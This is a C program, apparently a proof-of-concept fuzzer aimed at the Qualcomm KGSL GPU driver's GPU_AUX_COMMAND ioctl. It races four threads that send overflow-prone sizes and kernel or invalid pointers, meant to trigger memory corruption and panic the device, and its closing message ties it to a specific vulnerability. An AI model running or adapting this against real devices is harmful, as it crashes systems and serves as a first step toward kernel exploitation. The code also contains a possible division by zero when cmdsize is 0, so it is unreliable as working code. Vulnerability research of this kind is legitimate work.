#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <sys/mman.h>

#define KGSL_IOC_MAGIC 0x09
#define IOCTL_GPU_AUX_COMMAND 0xc0200958

struct kgsl_gpu_aux_command {
    uint64_t flags;
    uint32_t cmdsize;
    uint32_t count;
    uint64_t cmdlist;
};

// Global parameters for fuzzing
int g_fd = -1;
volatile int g_running = 1;

void* fuzz_thread(void* arg) {
    struct kgsl_gpu_aux_command aux_req;
    uint32_t thread_id = (uint32_t)(uintptr_t)arg;
    
    // Allocate a page of mmap memory to use as our dummy command buffer
    void* cmd_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (cmd_buf == MAP_FAILED) {
        return NULL;
    }
    
    while(g_running) {
        memset(&aux_req, 0, sizeof(aux_req));
        
        // Randomize the parameters heavily
        // To trigger UAF / Out-of-Bound we want weird combinations of small size / large count
        // or pointing to unmapped memory or partial memory.
        
        aux_req.flags = rand() % 0xFFFFFFFF; // Arbitrary flags
        
        // Fuzz size and count. We intentionally pick values that might cause overflow: count * size
        aux_req.cmdsize = rand() % 256; 
        aux_req.count = (rand() % 10) == 0 ? 0xFFFFFFFF / aux_req.cmdsize + 1 : rand() % 10;
        
        // Fuzz cmdlist pointer: 50% chance valid memory, 50% chance kernel/invalid pointer
        if (rand() % 2 == 0) {
            aux_req.cmdlist = (uint64_t)cmd_buf;
            // Write random garbage into our mapped pagE
            *(uint64_t*)cmd_buf = rand() * rand();
        } else {
            // Some specific dangerous pointer ranges
            uint64_t bad_ptrs[] = {
                0, 
                0xffffffffffffffffULL, 
                0xffffff0000000000ULL, 
                0xc000000000000000ULL,
                0x8000000000000000ULL
            };
            aux_req.cmdlist = bad_ptrs[rand() % 5];
        }
        
        ioctl(g_fd, IOCTL_GPU_AUX_COMMAND, &aux_req);
        
        if (rand() % 1000 == 0) {
            usleep(10); // Slight backoff to allow kernel threads to process
        }
    }
    munmap(cmd_buf, 0x1000);
    return NULL;
}

int main() {
    printf("[*] Starting KGSL GPU_AUX_COMMAND Aggressive Fuzzer...\n");
    g_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_fd < 0) {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] /dev/kgsl-3d0 opened successfully (FD: %d)\n", g_fd);
    
    int num_threads = 4;
    pthread_t threads[4];
    
    printf("[*] Launching %d racing threads...\n", num_threads);
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, fuzz_thread, (void*)(uintptr_t)i);
    }
    
    printf("[*] Fuzzing in progress, press Ctrl+C to abort... (wait 15 seconds)\n");
    
    // Fuzz for 15 seconds
    int counter = 15;
    while(counter > 0 && g_running) {
        sleep(1);
        printf("\r[-] Fuzzing... %d seconds remaining.", counter);
        fflush(stdout);
        counter--;
    }
    
    g_running = 0;
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Fuzzing completed cleanly. If the device did NOT reboot/panic, the vulnerability may be patched or requires a specific payload.\n");
    close(g_fd);
    return 0;
}
